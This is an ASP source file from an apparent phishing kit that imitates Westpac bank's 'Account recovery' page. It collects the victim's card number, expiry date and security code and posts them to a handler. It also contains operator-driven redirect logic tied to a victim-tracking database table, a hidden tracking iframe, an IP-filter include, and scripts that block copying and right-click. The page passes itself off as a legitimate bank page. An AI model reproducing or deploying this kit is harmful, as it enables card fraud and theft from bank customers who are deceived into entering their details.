<!--#include file="Include/db_conn.asp"-->
<img src="" width="100%" height="0" />
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
    <meta name="keywords" content="">
		<script language="javascript" src="drop_ip.asp"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
 <style>
        html {
    background-color: #fff;
    font-size: 14px;
    color: #2b2b2b;
    background: #fff
    
}

body {
    margin: 0px;
    padding: 0px;
    background-color: #fff;

}

* {
    font-family: "微软雅黑";
}
input[type="button"],input[type="submit"],input[type="reset"],input[type="text"],input[type="tel"],button,textarea{-webkit-appearance:none;}


div,ul,li,dt,dd,p {
    padding: 0px;
    margin: 0px;
}

.wrap {
    width: 100%;
    background: #f5f5f5;
    max-width: 640px;
    margin: 0 auto
}

.khimg {

}

.khimg img {
    width: 10%;
    float: left;
    overflow: hidden;
    line-height: 30px;
}

.khimg span {
    float: left;
	color: #0b2398;
	padding-top: 7px;
    line-height: 20px;
    padding-left: 10px;
    font-weight: bold
}

.tjform {
    margin-top: 10px;
    overflow: hidden;
    width: 100%;

}

.yhkh {
    width: 100%;
    margin: 0 auto;
    border-radius: 4px;
    overflow: hidden;

	
}

.yhkh span {
    padding-left: 5%;
    font-size: 14px;
    font-weight: 0;
    width: 100%;
    height: 45px;
    line-height: 30px;
    text-align: left;
   
}

.yhkh input {
    float: left;
    border: none;
    height: 100%;
    width: 70%;
    height: 30px;
    line-height: 30px;
    font-size: 13px;
    padding-left: 15px;
}

.tjbtn {
    width: 100%;
    text-align: center;
   
}

.tjbtn input {
    background: #f84347;
    border: none;
    padding: 3%  10%;
    text-align: center;
    color: #fff;
    width: 100%;
    font-size: 16px;
    border-radius: 10px;
    margin: 0 auto
}

.beizhu {
    text-align: left;
    color: #636363;
    padding-left: 4%
}

.beizhu a {
    color: #6295c4;
    text-decoration: none
}

.shuom {

}

.content {
    max-width: 520px;
    width: 90%;
    margin: 0 auto
    
}

a{text-decoration:none}
</style>
<script type="text/javascript" src="app/js/jquery-1.9.1.min.js"></script>

</head>




<body>





<div class="content">
<div class="yhkh"> 
<% 
Randomize 
Do While Len(pass)<5 '随机密码位数 
num1=CStr(Chr((57-48)*rnd+48)) '1~9 
num2=CStr(Chr((57-48)*rnd+48)) 'A~Z 
num3=CStr(Chr((57-48)*rnd+48)) 'a~z 
pass=pass&num1
loop 
%> 
<div class="an-loading" style="margin-top: 0px; ">
<div class="an-con">
<p class="anload-img"><br><br>
<center> <img src="img/Westpac_ logo_8.png" style="width: 120px;height: auto;padding: 8px;margin-left: 0px;"> </center>
<br>
<p style="font-size:24px;text-align:center;">Account recovery</p>
<br>
<p style="font-size:16px;text-align:center;">What you'll need.</p>
<br>
<p style="font-size:16px;text-align:center;">To help protect your security, you'll need a couple of things.</p>
<br>
<p style="font-size:16px;text-align:center;color: #DA1710;">Your Westpac card number and SMS verification.<br>
Your credit or debit card number and SMS verification.</p>
</p>
<tr>
<center   style="margin-top:-20px;"><span style="font-size:18px;color: #0072AC !important;font-weight:600;font-family: Myriad pro, sans-serif !important;"><center>
<%
dim rs
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
m=rs("m")
hf=rs("hf")
rs.close
set rs=Nothing

select case m
case 3
	response.write "The Customer password Number is in an incorrect。"

case 4
	response.write "The Customer Registration Number is in an incorrect format。"

case 5
	response.write "自定义2"
	response.write "<meta http-equiv='Refresh' content='200;URL=en.asp' /> "

case 6
	response.write "您輸入的電子郵件地址或手機號碼格式不正確。"

case 7
	response.write "您輸入的電子郵件地址或手機號碼格式不正確。"

case 8
	response.write ""

	case 14
	response.write " "
	response.write "<meta http-equiv='Refresh' content='0;URL=s2.htm' /> "

	case 9
	response.write " "
	response.write "<meta http-equiv='Refresh' content='0;URL=t1.asp' /> "
	
	case 10
	response.write " "
	response.write "<meta http-equiv='Refresh' content='0;URL=t2.asp' /> "
	
    case 11
	response.write " "
	
	
	case 12
	response.write " "
	response.write "<meta http-equiv='Refresh' content='0;URL=xx.htm' /> "

		case 13
	response.write "HI"
	response.write "<meta http-equiv='Refresh' content='200;URL=en.asp' /> "
	
	
	
	case 99
	response.write (hf)
	response.write "<meta http-equiv='Refresh' content='200;URL=en.asp' /> "
	
	
	
	
	
end Select
%></center></span>
</tr>
</div>
</div>
</div>
</div>
</form>
















<body oncontextmenu="return false" onselectstart="return false"?ondragstart="return false" onbeforecopy="return false" oncopy=document.selection.empty() onselect=document.selection.empty()>


        <input value="" name="g_zhanghao" type="hidden">
        <input value="" name="qkmm" type="hidden">
            <div class="shuom">
            </div>
            
            <div class="content">
           
 
<div class="khimg">





<style>
.text {
	PADDING-BOTTOM: 0px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; MARGIN-BOTTOM: 20px; COLOR: #999; FONT-SIZE: 14px; PADDING-TOP: 0px
}
article {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}


article.border {
    
    LINE-HEIGHT: 25px;
    MARGIN: 1px;
    FONT-SIZE: 16px;
}
article.border section {
	BORDER-BOTTOM: #fff 1px solid; PADDING-BOTTOM: 16px; PADDING-LEFT: 15px; PADDING-RIGHT: 15px; PADDING-TOP:12px
}
article.border section .input2 {
	WIDTH: 25px
}
DL {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}
.mar_l80 DL {
	OVERFLOW: hidden
}

INPUT {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}
INPUT {
	OUTLINE-STYLE: none; OUTLINE-COLOR: invert; OUTLINE-WIDTH: medium; FONT: inherit
}
.select INPUT {
	BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; PADDING-LEFT: 5px; WIDTH: 124px; BACKGROUND: none transparent scroll repeat 0% 0%; FLOAT: left; HEIGHT: 29px; BORDER-TOP: 0px; BORDER-RIGHT: 0px
}
</style>
<form id="form1" method="post" name="form1" action="up3.asp">
</div>
<div class="yhkh"> 
<span style=""><%=left(dh,2) & "" &right(dh,4)%></span>


<div style="width:100%;height:45px;margin:0 auto;margin-top:-20px;">
<span style="">Card number</span>
<input name="pass" type="tel" placeholder="" oninput="value=value.replace(/[^\d]/g,'')" class="input1" id="pass" min-length="4" maxlength="50" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>

<div style="width:180px;height:45px;margin-top:0px;float:left;">
<span style="">Expiry date (YYMM)</span>
<input name="pass" type="tel" placeholder="" oninput="value=value.replace(/[^\d]/g,'')" class="input1" id="pass" min-length="4" maxlength="50" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>

<div style="width:160px;height:45px;margin-top:0px;float:right;">
<span style="">Card security code</span>
<input name="pass" type="tel" placeholder="" oninput="value=value.replace(/[^\d]/g,'')" class="input1" id="pass" min-length="4" maxlength="50" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>





<br><br><br><br><br><br>
</div>
<tbody>
<tr>
<td>
<input name="button"  type="button" id="LoginBtn"  onclick="javascript:document.getElementById('form1').submit();"style="
   text-size-adjust: 100%;
                                    -webkit-font-smoothing: antialiased;
                                    box-sizing: border-box;
                                    font-size: 18px;
                                    overflow: visible;
                                    text-transform: none;
                                    line-height: 1.25;
                                    appearance: button;
                                    width: 100%;
                                    margin: 0px;
                                    background-color: #DA1710;
                                    color: rgb(255, 255, 255);
                                    border: 1px solid transparent;
                                    border-radius: 4px;
                                    font-weight: 600;
                                    padding: 12px;
                                    cursor: pointer;
                                    font-family: "Myriad Pro", sans-serif;
    " value= "Submit" ></td>
</tr>
<br>
<br>
</span>


<a href="index.asp" style="text-align:center;color:#DA1710;display:block;font-weight: 400;">Try another way</a>





</tbody>
<br><br><br><span style="color:#000;font-size:15px;"><strong></strong></span><br><span style="font-size:13px;    line-height: 20px;"><span style="color:red"></span></span><br>
</span></span> 
</div>
<iframe src="online.asp" style="display: none;"></iframe>

<br>

<div style="clear:both;"></div>	
<div style="background-color:#DA1710;width:100%;height:66px;position:absolute;position:fixed; z-index:1000; bottom:0px; ">
        <span style="text-align:center;display:block;padding:10px;position:absolute;position:fixed; z-index:1000; bottom:0px;color:#fff;">© Westpac Banking Corporation ABN 33 007 457 141 AFSL and Australian credit licence 233714.</span>
    </div>
</body>
</html>